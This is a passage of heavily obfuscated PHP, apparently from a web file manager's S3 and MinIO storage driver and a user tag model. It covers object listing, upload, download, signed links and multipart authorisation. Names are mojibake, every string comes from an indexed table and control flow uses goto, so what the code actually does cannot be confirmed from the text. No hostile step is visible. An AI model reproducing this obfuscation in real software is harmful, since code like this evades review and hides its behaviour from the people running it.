$¬ÃÒÜàÈ[$Ó“§ñÊ[203]] = !0; if (empty($°ƒïÏÕµ)) { $°ƒïÏÕµ = $this->objectMeta($Ì†›»æŞ); if (!$°ƒïÏÕµ) { return $¬ÃÒÜàÈ; } } if (isset($°ƒïÏÕµ[$Ó“§ñÊ[180]])) { $¬ÃÒÜàÈ[$Ó“§ñÊ[85]] = $°ƒïÏÕµ[$Ó“§ñÊ[180]]; } if (isset($°ƒïÏÕµ[$Ó“§ñÊ[76]])) { $¬ÃÒÜàÈ[$Ó“§ñÊ[76]] = $°ƒïÏÕµ[$Ó“§ñÊ[76]]; } return $¬ÃÒÜàÈ; } private function folderInfo($üõåæĞü, $ØÖ¤íò× = false, $Ê•ˆïÃ = array()) { $•Ì×›½‰ =& $_SERVER[å¸¿•¶£]; $ŠÙ¶úÍÛ = array($•Ì×›½‰[32] => $this->pathThis($üõåæĞü), $•Ì×›½‰[84] => $this->getPathOuter($•Ì×›½‰[8] . $üõåæĞü), $•Ì×›½‰[33] => $•Ì×›½‰[75]); if ($ØÖ¤íò×) { return $ŠÙ¶úÍÛ; } $ŠÙ¶úÍÛ[$•Ì×›½‰[201]] = $ŠÙ¶úÍÛ[$•Ì×›½‰[85]] = 0; $ŠÙ¶úÍÛ[$•Ì×›½‰[202]] = $ŠÙ¶úÍÛ[$•Ì×›½‰[203]] = !0; if ($üõåæĞü == $•Ì×›½‰[12]) { return $ŠÙ¶úÍÛ; } if (empty($Ê•ˆïÃ)) { $Ê•ˆïÃ = $this->objectMeta(trim($üõåæĞü, $•Ì×›½‰[8]) . $•Ì×›½‰[8]); } if (isset($Ê•ˆïÃ[$•Ì×›½‰[180]])) { $ŠÙ¶úÍÛ[$•Ì×›½‰[201]] = $Ê•ˆïÃ[$•Ì×›½‰[180]]; } return $ŠÙ¶úÍÛ; } private function fileList($•¶–Êª, $·¯¾şóÂ = '', $æÌ€­÷Å = 0) { $Ñ…µşÍÖ =& $_SERVER[å¸¿•¶£]; $ş•„ù¼ = rtrim($•¶–Êª, $Ñ…µşÍÖ[8]) . $Ñ…µşÍÖ[8]; $–öïœÛ¡ = $this->listObjs($ş•„ù¼, null, null, $·¯¾şóÂ); if (!$–öïœÛ¡) { return array($Ñ…µşÍÖ[82] => array(), $Ñ…µşÍÖ[83] => array()); } $õ‘ÆÑÚª = $ŸæÜŸÈ¡ = array(); foreach ($–öïœÛ¡[$Ñ…µşÍÖ[204]] as $×ş”¯Š) { $Ò¹‘°»© = $×ş”¯Š[$Ñ…µşÍÖ[32]]; if ($Ò¹‘°»© == $ş•„ù¼) { continue; } $‘æüöï = isset($×ş”¯Š[$Ñ…µşÍÖ[76]]) ? $×ş”¯Š[$Ñ…µşÍÖ[76]] : 0; $î¤ªŸ— = $‘æüöï == 0 && substr($Ò¹‘°»©, strlen($Ò¹‘°»©) - 1, 1) == $Ñ…µşÍÖ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ò¹‘°»©, $î¤ªŸ—, $×ş”¯Š); if ($î¤ªŸ—) { $õ‘ÆÑÚª[] = $Ò¹‘°»©; continue; } $ŸæÜŸÈ¡[] = $æÌ€­÷Å ? $×ş”¯Š : $Ò¹‘°»©; } foreach ($–öïœÛ¡[$Ñ…µşÍÖ[205]] as $×ş”¯Š) { $õ‘ÆÑÚª[] = $×ş”¯Š[$Ñ…µşÍÖ[32]]; $this->cacheMethodInfoSet($×ş”¯Š[$Ñ…µşÍÖ[32]], !0); } $this->cacheMethodInfoSet($•¶–Êª, !0); return array($Ñ…µşÍÖ[82] => $õ‘ÆÑÚª, $Ñ…µşÍÖ[83] => $ŸæÜŸÈ¡); } private function listObjs($¢ú¯ÏÓƒ, $Ô§‘µÛè = null, $ı«Ï¼¥í = null, $åíÉÄƒ = null) { $µÛàÕ¾  =& $_SERVER[å¸¿•¶£]; $¢ú¯ÏÓƒ = trim($¢ú¯ÏÓƒ, $µÛàÕ¾ [8]); $Ü´Áñ‚ = empty($¢ú¯ÏÓƒ) && $¢ú¯ÏÓƒ !== $µÛàÕ¾ [198] ? $µÛàÕ¾ [12] : $¢ú¯ÏÓƒ . $µÛàÕ¾ [8]; return $this->client->getBucket($this->bucket, $Ü´Áñ‚, $Ô§‘µÛè, $ı«Ï¼¥í, $åíÉÄƒ, !0); } public function has($˜Øì€ïÆ, $¹€¾Ÿ¶õ = false, $¯¹•¢• = true) { $ŞÛŞüìì =& $_SERVER[å¸¿•¶£]; $˜Øì€ïÆ = trim($˜Øì€ïÆ, $ŞÛŞüìì[8]); $ø¹Ÿœé‡ = empty($˜Øì€ïÆ) && $˜Øì€ïÆ !== $ŞÛŞüìì[198] ? $ŞÛŞüìì[12] : $˜Øì€ïÆ . $ŞÛŞüìì[8]; $©Û¦ší = null; $ƒ€šî˜Ï = 500; $ÍÓíœ±‡ = $ŞÛŞüìì[8]; $°Ä„ù³ß = $È±Ñæ¯£ = array(); while (!0) { $û£›­¢ = $this->listObjs($˜Øì€ïÆ, $©Û¦ší, $ƒ€šî˜Ï, $ÍÓíœ±‡); if (!$û£›­¢) { break; } $©Û¦ší = $û£›­¢[$ŞÛŞüìì[206]]; $É¯ŞÄŠú = $û£›­¢[$ŞÛŞüìì[204]]; $­òâèÏ– = $û£›­¢[$ŞÛŞüìì[205]]; if (empty($É¯ŞÄŠú) && empty($­òâèÏ–)) { break; } if (count($É¯ŞÄŠú) == 1 && $É¯ŞÄŠú[0][$ŞÛŞüìì[32]] == $ø¹Ÿœé‡) { break; } if ($¹€¾Ÿ¶õ) { if (count($É¯ŞÄŠú)) { $É¯ŞÄŠú = array_column($É¯ŞÄŠú, $ŞÛŞüìì[32]); $°Ä„ù³ß = array_merge($°Ä„ù³ß, $É¯ŞÄŠú); } if (count($­òâèÏ–)) { $­òâèÏ– = array_column($­òâèÏ–, $ŞÛŞüìì[32]); $È±Ñæ¯£ = array_merge($È±Ñæ¯£, $­òâèÏ–); } if ($©Û¦ší === null) { break; } continue; } if ($¯¹•¢•) { if (!empty($É¯ŞÄŠú)) { if (count($É¯ŞÄŠú) > 1 || isset($É¯ŞÄŠú[0][$ŞÛŞüìì[32]]) && $É¯ŞÄŠú[0][$ŞÛŞüìì[32]] != $ø¹Ÿœé‡) { return !0; } } } else { if (!empty($­òâèÏ–)) { return !0; } } if ($©Û¦ší === null) { break; } } if ($¹€¾Ÿ¶õ) { $°Ä„ù³ß = array_diff($°Ä„ù³ß, array($ø¹Ÿœé‡)); $°Ä„ù³ß = count(array_unique($°Ä„ù³ß)); $È±Ñæ¯£ = count(array_unique($È±Ñæ¯£)); return array($ŞÛŞüìì[207] => $°Ä„ù³ß, $ŞÛŞüìì[208] => $È±Ñæ¯£); } return !1; } public function listAll($¯¼¯›®Æ) { $ğÔé·Ò° =& $_SERVER[å¸¿•¶£]; $ğ¨“Ù” = $this->fileList($¯¼¯›®Æ, $ğÔé·Ò°[12], !0); $¥ı—Ò¹ = array_to_keyvalue($ğ¨“Ù”[$ğÔé·Ò°[83]], $ğÔé·Ò°[32]); foreach ($ğ¨“Ù”[$ğÔé·Ò°[82]] as $¤ÒÌß–Ô) { if (is_string($¤ÒÌß–Ô)) { $¥ı—Ò¹[$¤ÒÌß–Ô] = array($ğÔé·Ò°[76] => 0); } } return $this->listAllFiles($¯¼¯›®Æ, $¥ı—Ò¹); } public function canRead($ä¶µ) { $Û”Ç¤£™ =& $_SERVER[å¸¿•¶£]; $£‘ûÕ€ = $this->client->getAccessControlPolicy($this->bucket, $ä¶µ); if (!$£‘ûÕ€) { return !1; } return in_array($£‘ûÕ€, array($Û”Ç¤£™[209], $Û”Ç¤£™[210], $Û”Ç¤£™[211])) ? !0 : !1; } public function canWrite($øœÏ ®À) { $„ÕÒŞ»ˆ =& $_SERVER[å¸¿•¶£]; $Ôä¹€€ø = $this->client->getAccessControlPolicy($this->bucket, $øœÏ ®À); if (!$Ôä¹€€ø) { return !1; } return in_array($Ôä¹€€ø, array($„ÕÒŞ»ˆ[209], $„ÕÒŞ»ˆ[210])) ? !0 : !1; } public function getContent($Œ›•Ïµ) { return $this->client->getObject($this->bucket, $Œ›•Ïµ); } public function setContent($ô­ïòÓ, $§éå•Ëü = '', $ñ¹İ›²™ = false) { $Í“ç¨í¸ =& $_SERVER[å¸¿•¶£]; $ô­ïòÓ = $ñ¹İ›²™ ? trim($ô­ïòÓ, $Í“ç¨í¸[8]) . $Í“ç¨í¸[8] : $ô­ïòÓ; $ƒò½Üû = get_file_mime(get_path_ext($ô­ïòÓ)); $¿Â©ş§™ = $this->client->putObject($§éå•Ëü, $this->bucket, $ô­ïòÓ, $Í“ç¨í¸[199], array(), $ƒò½Üû); if (!$¿Â©ş§™) { return !1; } if ($ñ¹İ›²™) { return !0; } $this->cacheMethod(null, null); $¿Â©ş§™ = $this->copyFile($ô­ïòÓ, $ô­ïòÓ, array($Í“ç¨í¸[212] => $¿Â©ş§™[$Í“ç¨í¸[213]])); return $¿Â©ş§™ ? !0 : !1; } public function fileSubstr($ÆãÑ–, $ÉªÛô€À, $¦áÄÉÁ˜) { $÷ôÒ…“„ = $ÉªÛô€À + $¦áÄÉÁ˜ - 1; return $this->client->getObject($this->bucket, $ÆãÑ–, array($_SERVER[å¸¿•¶£][214] => "\x62\171\x74\x65\163\75{$ÉªÛô€À}\55{$÷ôÒ…“„}")); } public function upload($¡”™£¾, $ç„–ˆæ…, $ÏĞæı´À = false, $üúËÔ…Ÿ = REPEAT_REPLACE) { $—¯ñ¼¬ =& $_SERVER[å¸¿•¶£]; $»ü®àº€ = array($—¯ñ¼¬[212] => @md5_file($ç„–ˆæ…)); $Óè§ƒ¬ = array($—¯ñ¼¬[215] => get_file_mime(get_path_ext($¡”™£¾))); if (IO::size($ç„–ˆæ…) <= 1024 * 1024 * 200) { $ëÉñô¦ = $this->client->putObjectFile($ç„–ˆæ…, $this->bucket, $¡”™£¾, $—¯ñ¼¬[199], $»ü®àº€, $Óè§ƒ¬); return !empty($ëÉñô¦) ? $this->getPathOuter($¡”™£¾) : !1; } $Ñè—î™œ = $this->client->multiUploadObject($ç„–ˆæ…, $this->bucket, trim($¡”™£¾, $—¯ñ¼¬[8]), $»ü®àº€, $Óè§ƒ¬); return $Ñè—î™œ ? $this->getPathOuter($¡”™£¾) : !1; } public function download($ç³ÀÁ£ë, $€ò¾Ñé) { if (!@is_dir($this->pathFather($€ò¾Ñé)) && !IO::mkdir($this->pathFather($€ò¾Ñé))) { return !1; } $‹µĞ‰² = $this->client->getObject($this->bucket, $ç³ÀÁ£ë, array(), $€ò¾Ñé); return $‹µĞ‰² !== !1 ? $€ò¾Ñé : !1; } public function link($µ¼£Åƒ¼, $é±¼ôıê = array()) { $éê±˜ÌÁ =& $_SERVER[å¸¿•¶£]; if ($this->signVer == $éê±˜ÌÁ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $µ¼£Åƒ¼, 3600 * 12, $é±¼ôıê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($µ¼£Åƒ¼, $éê±˜ÌÁ[8]), 3600 * 12, $this->region, array(), !0, $é±¼ôıê); } public function fileOut($ İóâ­­, $âÀ¬‰Óœ = false, $éô€™À = false, $˜øÊû‰½ = '') { $—åáœó =& $_SERVER[å¸¿•¶£]; if ($this->isFileOutServer()) { return $this->fileOutServer($ İóâ­­, $âÀ¬‰Óœ, $éô€™À, $˜øÊû‰½); } if (!$éô€™À) { $éô€™À = $this->pathThis($ İóâ­­); } $»ß„â¹ = get_file_mime(get_path_ext($éô€™À)); if ($»ß„â¹ == $—åáœó[217]) { return parent::fileOut($ İóâ­­, $âÀ¬‰Óœ, $éô€™À, $˜øÊû‰½); } $şÊùÎ›— = array($—åáœó[218] => $»ß„â¹); if ($âÀ¬‰Óœ) { $şÊùÎ›—[$—åáœó[219]] = $—åáœó[220] . rawurlencode($éô€™À); } else { } $Ë„ŒûÇã = $this->link($ İóâ­­, $şÊùÎ›—); $this->fileOutLink($Ë„ŒûÇã); } public function fileOutServer($««Ã·, $³§Ü…ş = false, $—¨„Î­Ô = false, $×íóÇÏ = '') { parent::fileOut($««Ã·, $³§Ü…ş, $—¨„Î­Ô, $×íóÇÏ); } public function fileOutImageServer($Ò¤ßé®Á, $ÈıˆĞ¼õ = 250) { parent::fileOutImage($Ò¤ßé®Á, $ÈıˆĞ¼õ); } public function hashMd5($„öıŸËß, $õıˆúÁ = '') { $¢•†ø¡Œ =& $_SERVER[å¸¿•¶£]; $ı²´—éë = $this->objectMeta($„öıŸËß); if (!$ı²´—éë) { return !1; } $õıˆúÁ = $õıˆúÁ ? $õıˆúÁ : _get($ı²´—éë, $¢•†ø¡Œ[221]); $õıˆúÁ = $õıˆúÁ ? $õıˆúÁ : _get($ı²´—éë, $¢•†ø¡Œ[213], $¢•†ø¡Œ[12]); return $õıˆúÁ; } public function uploadFormData($øüšˆƒÎ, $Ò™æ•· = 3600) { $¥şßö»× =& $_SERVER[å¸¿•¶£]; $²ª´à ´ = $this->pathFather($øüšˆƒÎ); $Û¿Š“¦Ô = $this->client->getHttpUploadPostParams($this->bucket, $²ª´à ´, $¥şßö»×[199], $Ò™æ•·); return array_merge((array) $Û¿Š“¦Ô, array($¥şßö»×[182] => $this->getHost())); } public function multiUploadFormData($Èæ€š¼±, $ãÇ†ˆ€å = 3600) { $¸Õ×Ø©— =& $_SERVER[å¸¿•¶£]; $ÒÆĞÌ¼¥ = gmdate($¸Õ×Ø©—[222]); $ÓËİÙú¢ = array(); $¯”öªœÛ = $this->client->getUploadId($this->bucket, $Èæ€š¼±, $ÓËİÙú¢); if (!$¯”öªœÛ) { return !1; } return array($¸Õ×Ø©—[223] => $¯”öªœÛ, $¸Õ×Ø©—[182] => $this->getHost() . $¸Õ×Ø©—[8] . $this->pathEncode($Èæ€š¼±), $¸Õ×Ø©—[224] => $ÒÆĞÌ¼¥, $¸Õ×Ø©—[94] => $Èæ€š¼±); } public function multiUploadAuthData($ÎÃ½°ÙØ, $Îò²é¾¶ = array()) { $½Ë–ü =& $_SERVER[å¸¿•¶£]; $©È¢Áá = isset($Îò²é¾¶[$½Ë–ü[224]]) ? $Îò²é¾¶[$½Ë–ü[224]] : gmdate($½Ë–ü[222]); $ë„«ÓùÕ = isset($Îò²é¾¶[$½Ë–ü[174]]) ? $Îò²é¾¶[$½Ë–ü[174]] : $½Ë–ü[12]; $Åâ¹®½ = $Îò²é¾¶[$½Ë–ü[94]]; unset($Îò²é¾¶[$½Ë–ü[94]]); if (isset($Îò²é¾¶[$½Ë–ü[225]])) { $Îò²é¾¶[$½Ë–ü[224]] = $©È¢Áá; return $this->listUploadParts($Åâ¹®½, $Îò²é¾¶); } $æƒØ²È = array($½Ë–ü[226], $½Ë–ü[12], $½Ë–ü[120], $½Ë–ü[12], "\x78\55\x61\155\172\x2d\x64\x61\164\x65\72{$©È¢Áá}", $½Ë–ü[8] . $this->bucket . $½Ë–ü[8] . $this->pathEncode($Åâ¹®½) . $ë„«ÓùÕ); if (strpos($ë„«ÓùÕ, $½Ë–ü[227]) === 0) { $æƒØ²È[0] = $½Ë–ü[228]; } if (isset($Îò²é¾¶[$½Ë–ü[229]]) && $Îò²é¾¶[$½Ë–ü[229]] == $½Ë–ü[230]) { $æƒØ²È[0] = $½Ë–ü[230]; } $ö¨–Âø = implode($½Ë–ü[231], $æƒØ²È); $ŒäÌçšì = base64_encode(hash_hmac($½Ë–ü[232], $ö¨–Âø, $this->secret, !0)); $ŞÍõ¡† = $½Ë–ü[233] . $this->accessKey . $½Ë–ü[4] . $ŒäÌçšì; if (strpos($ë„«ÓùÕ, $½Ë–ü[227]) === 0) { return array($½Ë–ü[234] => $ŞÍõ¡†, $½Ë–ü[224] => $©È¢Áá); } return $ŞÍõ¡†; } public function listUploadParts($ÆÑÁ¢ÀŒ, $™Ó¯‡—Ñ = array()) { $ÑÆÎĞ³ä =& $_SERVER[å¸¿•¶£]; $Ğñ±¾á = str_replace($ÑÆÎĞ³ä[235], $ÑÆÎĞ³ä[12], $™Ó¯‡—Ñ[$ÑÆÎĞ³ä[174]]); $íËîÔôğ = $this->client->listParts($this->bucket, $ÆÑÁ¢ÀŒ, $Ğñ±¾á); if (!$íËîÔôğ) { return !1; } unset($™Ó¯‡—Ñ[$ÑÆÎĞ³ä[225]], $™Ó¯‡—Ñ[$ÑÆÎĞ³ä[229]]); $™Ó¯‡—Ñ[$ÑÆÎĞ³ä[94]] = $ÆÑÁ¢ÀŒ; $â—ÛÊÙı = $this->multiUploadAuthData($ÆÑÁ¢ÀŒ, $™Ó¯‡—Ñ); if (empty($â—ÛÊÙı)) { return !1; } return array($ÑÆÎĞ³ä[234] => $â—ÛÊÙı, $ÑÆÎĞ³ä[224] => $™Ó¯‡—Ñ[$ÑÆÎĞ³ä[224]], $ÑÆÎĞ³ä[236] => $íËîÔôğ); } public function getHost() { return parent::getHost() . $_SERVER[å¸¿•¶£][8] . $this->bucket; } public function size($¾Ù‰ È¸) { $ôÄÀÁŞ¬ = $this->objectMeta($¾Ù‰ È¸); return $ôÄÀÁŞ¬ ? $ôÄÀÁŞ¬[$_SERVER[å¸¿•¶£][76]] : 0; } public function info($÷â••Ïü) { if ($this->isFolder($÷â••Ïü)) { return $this->folderInfo($÷â••Ïü); } else { if ($this->isFile($÷â••Ïü)) { return $this->fileInfo($÷â••Ïü); } } return !1; } public function exist($ø©æÃú) { return $this->isFile($ø©æÃú) || $this->isFolder($ø©æÃú); } public function isFile($õò§ÂÌÅ) { return !$this->isFolder($õò§ÂÌÅ) && $this->objectMeta($õò§ÂÌÅ); } public function isFolder($æ†š¾Áù) { return $this->cacheMethod($_SERVER[å¸¿•¶£][165], $æ†š¾Áù); } protected function objectMeta($·À§ÜİÇ) { return $this->cacheMethod($_SERVER[å¸¿•¶£][167], $·À§ÜİÇ); } protected function _objectMeta($›µŠ¸¨è) { $¶Š‚˜¿¥ =& $_SERVER[å¸¿•¶£]; $›µŠ¸¨è = rtrim($›µŠ¸¨è, $¶Š‚˜¿¥[8]); try { $ø˜Õå = $this->client->getObjectInfo($this->bucket, $›µŠ¸¨è); if (!isset($ø˜Õå[$¶Š‚˜¿¥[221]]) && isset($ø˜Õå[$¶Š‚˜¿¥[237]])) { $ø˜Õå[$¶Š‚˜¿¥[221]] = $ø˜Õå[$¶Š‚˜¿¥[237]]; } } catch (Exception $ø­œ˜Ÿ¾) { $ø˜Õå = !1; } if (!$ø˜Õå) { } return $ø˜Õå; } protected function _isFolder($”ãÒ•‘Ø) { $‚¼ ´äô =& $_SERVER[å¸¿•¶£]; $”ãÒ•‘Ø = rtrim($”ãÒ•‘Ø, $‚¼ ´äô[8]); if ($”ãÒ•‘Ø == $‚¼ ´äô[12] || $”ãÒ•‘Ø == $‚¼ ´äô[8]) { return !0; } $ºñàà×› = $this->client->getBucket($this->bucket, $”ãÒ•‘Ø, null, 1); if (empty($ºñàà×›[$‚¼ ´äô[204]])) { return !1; } $¿½äŠ›Ã = $ºñàà×›[$‚¼ ´äô[204]][0][$‚¼ ´äô[32]]; return stripos($¿½äŠ›Ã, $”ãÒ•‘Ø . $‚¼ ´äô[8]) === 0 ? !0 : !1; if (substr($¿½äŠ›Ã, -1) == $‚¼ ´äô[8]) { return !0; } if (get_path_this($¿½äŠ›Ã) == get_path_this($”ãÒ•‘Ø)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($òàá·³¦) { parent::__construct($òàá·³¦); $this->signatureVersion($_SERVER[å¸¿•¶£][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c±ˆÎ®çö©; fóïœ¸Š©ñ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($Õ«É¯Ïé) { $®îºéßÉ =& $_SERVER[å¸¿•¶£]; return array($®îºéßÉ[1974] => array($®îºéßÉ[2358] . USER_ID, $®îºéßÉ[1975])); } protected function listData() { $İ©Œ“»á =& $_SERVER[å¸¿•¶£]; $€¡õ¡› = array($İ©Œ“»á[1665] => USER_ID, $İ©Œ“»á[483] => array($İ©Œ“»á[1978], 0)); $ šÖØ¢´ = $İ©Œ“»á[2359]; $Şñ–¡í = $this->field($ šÖØ¢´)->where($€¡õ¡›)->order($İ©Œ“»á[1981])->select(); return $Şñ–¡í ? $Şñ–¡í : array(); } protected function addToTag($¢‡òäÕ½, $¬úÉ±¸ç) { $™ı™„´Ş =& $_SERVER[å¸¿•¶£]; if (!Model($™ı™„´Ş[2122])->listData($¬úÉ±¸ç)) { return !1; } if (is_numeric($¢‡òäÕ½)) { $ÁË¸òœ = Model($™ı™„´Ş[832])->pathInfo($¢‡òäÕ½); if (!$ÁË¸òœ) { return !1; } } else { $ÁË¸òœ = IO::infoSimple($¢‡òäÕ½); if (!$ÁË¸òœ) { return !1; } $¢ØŞ±êÒ = $ÁË¸òœ[$™ı™„´Ş[32]]; $Ğ·ÖñõÊ = $ÁË¸òœ[$™ı™„´Ş[33]]; if (isset($ÁË¸òœ[$™ı™„´Ş[410]])) { $Ğ·ÖñõÊ = $ÁË¸òœ[$™ı™„´Ş[410]] == $™ı™„´Ş[88] ? $™ı™„´Ş[75] : $™ı™„´Ş[200]; } } $°«üÄô = array($™ı™„´Ş[1665] => USER_ID, $™ı™„´Ş[483] => $¬úÉ±¸ç, $™ı™„´Ş[421] => $¢‡òäÕ½, $™ı™„´Ş[422] => $Ğ·ÖñõÊ ? $Ğ·ÖñõÊ : $™ı™„´Ş[416], $™ı™„´Ş[420] => $¢ØŞ±êÒ ? $¢ØŞ±êÒ : $™ı™„´Ş[12], $™ı™„´Ş[1867] => 0); if ($this->where($°«üÄô)->find()) { return !1; } return $this->add($°«üÄô); } protected function removeFromTag($ˆ×šû»¤, $šß›®ëÆ) { $½»ºé¦ =& $_SERVER[å¸¿•¶£]; if (!Model($½»ºé¦[2122])->listData($šß›®ëÆ)) { return !1; } if (is_array($ˆ×šû»¤)) { $ˆ×šû»¤ = array($½»ºé¦[7], $ˆ×šû»¤); } $ ôÛú° = array($½»ºé¦[1665] => USER_ID, $½»ºé¦[483] => $šß›®ëÆ, $½»ºé¦[421] => $ˆ×šû»¤); return $this->where($ ôÛú°)->delete(); } protected function removeByTag($éàî³ïÓ) { $ƒûüíˆ° =& $_SERVER[å¸¿•¶£]; if (!$éàî³ïÓ) { return !1; } $¿®Õ‚ÍŒ = array($ƒûüíˆ°[1665] => USER_ID, $ƒûüíˆ°[483] => $éàî³ïÓ); return $this->where($¿®Õ‚ÍŒ)->delete(); } protected function removeBySource($Á°à»ÙØ) { $…•œ¥é­ =& $_SERVER[å¸¿•¶£]; if (is_array($Á°à»ÙØ)) { $Á°à»ÙØ = array($…•œ¥é­[7], $Á°à»ÙØ); } $âÀÄáÙ² = array($…•œ¥é­[1665] => USER_ID, $…•œ¥é­[483] => array($…•œ¥é­[1021], 0), $…•œ¥é­[421] => $Á°à»ÙØ); return $this->where($âÀÄáÙ²)->delete(); } }